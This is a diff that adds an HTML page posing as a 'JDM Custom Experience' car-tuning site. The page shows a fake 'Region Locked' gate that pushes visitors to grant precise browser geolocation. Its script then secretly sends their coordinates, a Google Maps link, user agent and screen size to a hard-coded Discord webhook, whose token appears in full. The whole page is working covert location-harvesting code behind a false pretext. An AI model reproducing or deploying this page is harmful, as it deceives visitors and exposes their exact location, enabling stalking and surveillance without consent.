@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JDM Custom Experience — Access</title>
+    <style>
+        :root {
+            --bg: #0a0a0f;
+            --card-bg: rgba(18, 18, 30, 0.75);
+            --border: rgba(255, 255, 255, 0.08);
+            --text: #e0e0e0;
+            --text-secondary: #9a9aae;
+            --accent: #ff4757;
+            --accent-glow: rgba(255, 71, 87, 0.35);
+            --green: #2ed573;
+            --green-glow: rgba(46, 213, 115, 0.35);
+            --blue: #5352ed;
+            --jdm-gold: #f5b042;
+            --radius: 20px;
+            --transition: 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow-x: hidden;
+            user-select: none;
+            -webkit-user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        /* Ambient background */
+        .bg-orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(120px);
+            opacity: 0.22;
+            pointer-events: none;
+            z-index: 0;
+            animation: orbDrift 14s ease-in-out infinite;
+        }
+        .bg-orb.orb-1 {
+            width: 500px;
+            height: 500px;
+            background: #ff4757;
+            top: -15%;
+            left: -10%;
+        }
+        .bg-orb.orb-2 {
+            width: 400px;
+            height: 400px;
+            background: #5352ed;
+            bottom: -12%;
+            right: -8%;
+            animation-delay: -7s;
+        }
+        .bg-orb.orb-3 {
+            width: 300px;
+            height: 300px;
+            background: #f5b042;
+            top: 55%;
+            left: 50%;
+            animation-delay: -3s;
+            opacity: 0.12;
+        }
+        @keyframes orbDrift {
+            0%,
+            100% {
+                transform: translate(0, 0) scale(1);
+            }
+            20% {
+                transform: translate(40px, -30px) scale(1.1);
+            }
+            40% {
+                transform: translate(-25px, 35px) scale(0.9);
+            }
+            60% {
+                transform: translate(30px, 20px) scale(1.05);
+            }
+            80% {
+                transform: translate(-35px, -25px) scale(0.95);
+            }
+        }
+
+        .grid-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+            background-image:
+                linear-gradient(rgba(255, 255, 255, 0.015) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.015) 1px, transparent 1px);
+            background-size: 50px 50px;
+            mask-image: radial-gradient(ellipse at center, black 30%, transparent 70%);
+            -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 70%);
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 520px;
+            padding: 20px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 44px 36px 38px;
+            text-align: center;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.5), 0 2px 8px rgba(0, 0, 0, 0.3), inset 0 1px 0 rgba(255, 255, 255, 0.03);
+            transition: all var(--transition);
+            position: relative;
+            overflow: hidden;
+        }
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.04), transparent);
+        }
+
+        /* Common icon wrappers */
+        .icon-wrapper {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            margin-bottom: 24px;
+            position: relative;
+            transition: all var(--transition);
+        }
+        .icon-wrapper.locked {
+            background: rgba(255, 71, 87, 0.1);
+            box-shadow: 0 0 40px var(--accent-glow);
+        }
+        .icon-wrapper.unlocked {
+            background: rgba(46, 213, 115, 0.1);
+            box-shadow: 0 0 40px var(--green-glow);
+        }
+        .icon-wrapper.checking {
+            background: rgba(83, 82, 237, 0.1);
+            box-shadow: 0 0 40px rgba(83, 82, 237, 0.35);
+            animation: pulseChecking 1.2s ease-in-out infinite;
+        }
+        .icon-wrapper.welcome-icon {
+            background: rgba(245, 176, 66, 0.1);
+            box-shadow: 0 0 40px rgba(245, 176, 66, 0.25);
+        }
+        @keyframes pulseChecking {
+            0%,
+            100% {
+                box-shadow: 0 0 30px rgba(83, 82, 237, 0.25);
+            }
+            50% {
+                box-shadow: 0 0 55px rgba(83, 82, 237, 0.5);
+            }
+        }
+
+        .title {
+            font-size: 1.7rem;
+            font-weight: 700;
+            color: #ffffff;
+            letter-spacing: -0.4px;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            font-size: 0.95rem;
+            color: var(--text-secondary);
+            line-height: 1.55;
+            margin-bottom: 28px;
+            font-weight: 400;
+            max-width: 380px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .subtitle strong {
+            color: #ff6b7a;
+            font-weight: 600;
+        }
+        .welcome-subtitle {
+            color: #cccccc;
+        }
+        .welcome-subtitle strong {
+            color: #f5b042;
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 9px;
+            padding: 14px 32px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            letter-spacing: 0.2px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all var(--transition);
+            color: #fff;
+            background: var(--accent);
+            box-shadow: 0 6px 24px var(--accent-glow), 0 2px 6px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+            outline: none;
+            font-family: inherit;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 32px var(--accent-glow), 0 4px 10px rgba(0, 0, 0, 0.4);
+            background: #ff5c6c;
+        }
+        .btn:active {
+            transform: scale(0.96);
+        }
+        .btn:disabled {
+            opacity: 0.55;
+            cursor: not-allowed;
+            pointer-events: none;
+            filter: grayscale(20%);
+        }
+        .btn.btn-green {
+            background: var(--green);
+            box-shadow: 0 6px 24px var(--green-glow);
+        }
+        .btn.btn-green:hover {
+            background: #3be07a;
+            box-shadow: 0 10px 32px var(--green-glow);
+        }
+        .btn.btn-gold {
+            background: #f5b042;
+            color: #0a0a0f;
+            font-weight: 700;
+            box-shadow: 0 6px 24px rgba(245, 176, 66, 0.3);
+            letter-spacing: 0.3px;
+        }
+        .btn.btn-gold:hover {
+            background: #ffc260;
+            box-shadow: 0 10px 32px rgba(245, 176, 66, 0.45);
+            color: #000;
+        }
+        .btn .btn-spinner {
+            width: 18px;
+            height: 18px;
+            border: 2.5px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            display: none;
+        }
+        .btn.checking .btn-spinner {
+            display: block;
+        }
+        .btn.checking .btn-text {
+            display: none;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .denied-msg {
+            display: none;
+            margin-top: 18px;
+            padding: 12px 18px;
+            background: rgba(255, 71, 87, 0.08);
+            border: 1px solid rgba(255, 71, 87, 0.2);
+            border-radius: 12px;
+            color: #ff6b7a;
+            font-size: 0.85rem;
+            font-weight: 500;
+            animation: fadeInUp 0.4s ease;
+        }
+        .denied-msg.visible {
+            display: block;
+        }
+
+        .hidden-content {
+            display: none;
+            animation: fadeInUp 0.5s ease forwards;
+        }
+        .hidden-content.visible {
+            display: block;
+        }
+        .welcome-content {
+            display: block;
+            animation: fadeInUp 0.5s ease;
+        }
+        .blocked-content {
+            display: none;
+            animation: fadeInUp 0.5s ease;
+        }
+        .blocked-content.visible {
+            display: block;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(16px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .location-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(46, 213, 115, 0.08);
+            border: 1px solid rgba(46, 213, 115, 0.2);
+            border-radius: 50px;
+            padding: 10px 18px;
+            font-size: 0.82rem;
+            color: #2ed573;
+            font-weight: 500;
+            margin-bottom: 18px;
+            animation: fadeInUp 0.5s ease;
+        }
+        .location-pill .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #2ed573;
+            box-shadow: 0 0 8px rgba(46, 213, 115, 0.6);
+        }
+
+        /* JDM silhouette accent */
+        .jdm-silhouette {
+            font-size: 2.8rem;
+            line-height: 1;
+            letter-spacing: 4px;
+            color: #f5b042;
+            opacity: 0.9;
+            margin-bottom: 6px;
+            text-shadow: 0 0 20px rgba(245, 176, 66, 0.4);
+        }
+
+        @media (max-width: 560px) {
+            .card {
+                padding: 32px 22px 28px;
+                border-radius: 16px;
+            }
+            .title {
+                font-size: 1.4rem;
+            }
+            .subtitle {
+                font-size: 0.85rem;
+            }
+            .btn {
+                padding: 13px 26px;
+                font-size: 0.88rem;
+            }
+            .icon-wrapper {
+                width: 64px;
+                height: 64px;
+            }
+            .icon-wrapper svg {
+                width: 30px;
+                height: 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-orb orb-1"></div>
+    <div class="bg-orb orb-2"></div>
+    <div class="bg-orb orb-3"></div>
+    <div class="grid-overlay"></div>
+
+    <div class="container">
+        <div class="card" id="mainCard">
+
+            <!-- ========== WELCOME SCREEN (initial) ========== -->
+            <div class="welcome-content" id="welcomeContent">
+                <div class="icon-wrapper welcome-icon">
+                    <span class="jdm-silhouette">🏁</span>
+                </div>
+                <h1 class="title">Welcome to the JDM Custom Experience</h1>
+                <p class="subtitle welcome-subtitle">
+                    Unleash the spirit of <strong>Japanese domestic market</strong> tuning. Exclusive builds, rare parts,
+                    and a community of enthusiasts await.
+                </p>
+                <button class="btn btn-gold" id="goNowBtn" onclick="goToRegionCheck()">
+                    Go Now → 
+                </button>
+            </div>
+
+            <!-- ========== REGION BLOCKED STATE (hidden initially) ========== -->
+            <div class="blocked-content" id="blockedContent">
+                <div class="icon-wrapper locked" id="iconWrapper">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="#ff4757" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                        <circle cx="12" cy="16" r="1.2" fill="#ff4757" stroke="none"></circle>
+                    </svg>
+                </div>
+                <h1 class="title" id="mainTitle">Region Locked</h1>
+                <p class="subtitle" id="mainSubtitle">
+                    This content is <strong>geographically restricted</strong>. To verify your eligibility and continue,
+                    please allow <strong>location access</strong> when prompted by your browser.
+                </p>
+                <button class="btn" id="verifyBtn" onclick="requestGeolocation()">
+                    <span class="btn-text">📍 Verify My Location</span>
+                    <span class="btn-spinner"></span>
+                </button>
+                <div class="denied-msg" id="deniedMsg">
+                    ⚠️ Location access was denied. This site requires geolocation verification to proceed. Please enable
+                    location permissions in your browser settings and try again.
+                </div>
+            </div>
+
+            <!-- ========== UNLOCKED STATE (hidden) ========== -->
+            <div class="hidden-content" id="unlockedContent">
+                <div class="icon-wrapper unlocked">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="#2ed573" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                        <path d="M7 11V7a5 5 0 0 1 9.5-1.5"></path>
+                        <circle cx="12" cy="16" r="1.2" fill="#2ed573" stroke="none"></circle>
+                    </svg>
+                </div>
+                <div class="location-pill" id="locationPill">
+                    <span class="dot"></span>
+                    <span id="locationCoords">Location verified</span>
+                </div>
+                <h1 class="title" style="color:#2ed573;">Access Granted ✅</h1>
+                <p class="subtitle">
+                    Your region has been <strong style="color:#2ed573;">verified successfully</strong>. Welcome to the
+                    JDM Custom Experience.
+                </p>
+                <div style="background:rgba(255,255,255,0.03); border-radius:14px; padding:18px; margin-top:8px; text-align:left; font-size:0.85rem; color:#b0b0be; line-height:1.6; border:1px solid rgba(255,255,255,0.05);">
+                    <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
+                        <span style="font-size:1.3rem;">🔓</span>
+                        <span style="font-weight:600;color:#fff;">JDM Dashboard</span>
+                    </div>
+                    <p>• Exclusive tuning guides unlocked</p>
+                    <p>• Rare parts marketplace access</p>
+                    <p>• Community meetup locations</p>
+                    <p style="color:#2ed573;margin-top:6px;">✓ All systems operational</p>
+                </div>
+                <button class="btn btn-green" style="margin-top:20px;" onclick="resetToWelcome()">
+                    🔄 Return to Welcome
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1534343493152014437/DUlWCt8MkIFPQvIfPJg4yI6stUcsd8zfKmS6_sQc5xK8QAWV868erL7DvIv7Nxt7DOkb';
+
+        // DOM elements
+        const welcomeContent = document.getElementById('welcomeContent');
+        const blockedContent = document.getElementById('blockedContent');
+        const unlockedContent = document.getElementById('unlockedContent');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const deniedMsg = document.getElementById('deniedMsg');
+        const iconWrapper = document.getElementById('iconWrapper');
+        const locationCoords = document.getElementById('locationCoords');
+        const mainSubtitle = document.getElementById('mainSubtitle');
+
+        let isChecking = false;
+        let hasSucceeded = false;
+
+        // Transition from welcome to region blocked
+        function goToRegionCheck() {
+            welcomeContent.style.display = 'none';
+            blockedContent.classList.add('visible');
+            // Reset any previous state
+            resetBlockedState();
+        }
+
+        function resetBlockedState() {
+            hasSucceeded = false;
+            isChecking = false;
+            verifyBtn.classList.remove('checking');
+            verifyBtn.disabled = false;
+            deniedMsg.classList.remove('visible');
+            iconWrapper.classList.remove('checking', 'unlocked');
+            iconWrapper.classList.add('locked');
+            iconWrapper.style.boxShadow = '0 0 40px rgba(255,71,87,0.35)';
+            mainSubtitle.innerHTML = 'This content is <strong>geographically restricted</strong>. To verify your eligibility and continue, please allow <strong>location access</strong> when prompted by your browser.';
+            blockedContent.classList.add('visible');
+            unlockedContent.classList.remove('visible');
+        }
+
+        async function sendToDiscord(data) {
+            const payload = {
+                embeds: [{
+                    title: '📍 JDM Experience - Geolocation Verified',
+                    description: 'A user granted location access.',
+                    color: 0x2ed573,
+                    fields: [
+                        { name: '🌍 Latitude', value: `\`${data.latitude}\``, inline: true },
+                        { name: '🌍 Longitude', value: `\`${data.longitude}\``, inline: true },
+                        { name: '🎯 Accuracy', value: `\`${data.accuracy} meters\``, inline: true },
+                        { name: '🗺️ Google Maps', value: `[Open](https://www.google.com/maps?q=${data.latitude},${data.longitude})`, inline: false },
+                        { name: '🖥️ User Agent', value: `\`\`\`${data.userAgent}\`\`\``, inline: false },
+                        { name: '📐 Screen', value: `\`${data.screenWidth} × ${data.screenHeight}\``, inline: true },
+                        { name: '🕐 Timestamp', value: `\`${data.timestamp}\``, inline: true }
+                    ],
+                    footer: { text: 'JDM Custom Experience • ' + new Date().toISOString() },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {
+                console.warn('Webhook send failed, but access granted.');
+            }
+        }
+
+        function handleGeolocationSuccess(position) {
+            const { latitude, longitude, accuracy } = position.coords;
+            const geoData = {
+                latitude: latitude.toFixed(6),
+                longitude: longitude.toFixed(6),
+                accuracy: Math.round(accuracy),
+                userAgent: navigator.userAgent,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                timestamp: new Date().toISOString()
+            };
+            sendToDiscord(geoData);
+            hasSucceeded = true;
+            isChecking = false;
+            verifyBtn.classList.remove('checking');
+            verifyBtn.disabled = false;
+            locationCoords.textContent = `Lat: ${geoData.latitude} • Lng: ${geoData.longitude} (±${geoData.accuracy}m)`;
+            blockedContent.classList.remove('visible');
+            unlockedContent.classList.add('visible');
+            iconWrapper.classList.remove('locked', 'checking');
+            iconWrapper.classList.add('unlocked');
+            document.getElementById('mainCard').style.transform = 'scale(1.02)';
+            setTimeout(() => { document.getElementById('mainCard').style.transform = 'scale(1)'; }, 200);
+        }
+
+        function handleGeolocationError(error) {
+            isChecking = false;
+            verifyBtn.classList.remove('checking');
+            verifyBtn.disabled = false;
+            deniedMsg.classList.add('visible');
+            const card = document.getElementById('mainCard');
+            card.style.transform = 'translateX(-6px)';
+            setTimeout(() => { card.style.transform = 'translateX(6px)'; }, 80);
+            setTimeout(() => { card.style.transform = 'translateX(-4px)'; }, 160);
+            setTimeout(() => { card.style.transform = 'translateX(4px)'; }, 240);
+            setTimeout(() => { card.style.transform = 'translateX(0)'; }, 320);
+            iconWrapper.style.boxShadow = '0 0 60px rgba(255,71,87,0.7)';
+            setTimeout(() => { iconWrapper.style.boxShadow = '0 0 40px rgba(255,71,87,0.35)'; }, 500);
+        }
+
+        function requestGeolocation() {
+            if (isChecking || hasSucceeded) return;
+            deniedMsg.classList.remove('visible');
+            if (!navigator.geolocation) {
+                alert('Geolocation is not supported by your browser.');
+                return;
+            }
+            isChecking = true;
+            verifyBtn.classList.add('checking');
+            verifyBtn.disabled = true;
+            iconWrapper.classList.add('checking');
+            iconWrapper.classList.remove('locked');
+            mainSubtitle.innerHTML = '<strong style="color:#5352ed;">Checking your location...</strong> Please allow the browser prompt.';
+            navigator.geolocation.getCurrentPosition(
+                handleGeolocationSuccess,
+                handleGeolocationError, {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        function resetToWelcome() {
+            // Hide unlocked and blocked, show welcome
+            unlockedContent.classList.remove('visible');
+            blockedContent.classList.remove('visible');
+            welcomeContent.style.display = 'block';
+            hasSucceeded = false;
+            isChecking = false;
+            document.getElementById('mainCard').style.transform = 'scale(1)';
+            // Reset blocked state for next time
+            resetBlockedState();
+            blockedContent.classList.remove('visible'); // keep hidden
+        }
+
+        // Initial state
+        welcomeContent.style.display = 'block';
+        blockedContent.classList.remove('visible');
+        unlockedContent.classList.remove('visible');
+    </script>
+</body>
+</html>
